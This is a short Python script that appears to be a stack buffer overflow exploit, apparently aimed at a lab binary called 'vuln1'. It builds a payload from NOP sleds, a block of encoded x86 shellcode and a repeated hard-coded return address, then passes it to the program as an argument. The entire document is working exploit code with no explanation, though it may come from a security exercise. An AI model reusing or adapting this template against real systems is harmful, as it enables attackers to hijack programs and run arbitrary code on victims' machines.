import subprocess

buf = "\x90"*138

buf += "\xbb\x37\xdf\x4f\x08\xdd\xc6\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x0b\x83\xea\xfc\x31\x5a\x11\x03\x5a\x11\xe2"
buf += "\xc2\xb5\x44\x50\xb5\x18\x3d\x08\xe8\xff\x48\x2f\x9a"
buf += "\xd0\x39\xd8\x5a\x47\x91\x7a\x33\xf9\x64\x99\x91\xed"
buf += "\x7f\x5e\x15\xee\x50\x3c\x7c\x80\x81\xb3\x16\x5c\x89"
buf += "\x60\x6f\xbd\xf8\x07"

buf += "\x90"*48

buf += "\x10\xf1\xff\xbf"*25

subprocess.call(['./vuln1', buf])